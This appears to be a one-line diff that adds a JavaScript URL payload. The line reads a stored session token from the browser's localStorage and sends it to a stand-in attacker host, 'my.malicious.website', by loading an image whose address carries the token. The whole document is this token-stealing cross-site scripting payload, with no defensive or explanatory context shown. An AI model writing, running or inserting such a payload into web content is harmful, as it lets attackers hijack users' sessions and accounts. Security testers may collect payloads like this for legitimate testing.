@@ -1,0 +1,1 @@
+javascript:var token = window.localStorage.state; var img=document.createElement("img"); img.setAttribute('src', 'http://my.malicious.website/?stolenToken=' + token); document.body.appendChild(img);
